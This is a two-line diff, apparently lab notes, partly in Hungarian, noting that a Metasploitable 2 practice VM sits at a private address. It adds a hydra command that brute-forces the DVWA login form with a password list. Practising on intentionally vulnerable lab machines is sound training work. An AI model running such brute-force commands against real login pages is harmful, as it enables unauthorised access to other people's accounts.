@@ -1,0 +1,2 @@
+A Metasploitabe 2" VM a 192.168.56.104 IP címen található.
+hydra 192.168.56.104 -l admin -P passwords http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&submit=Login:Login failed"
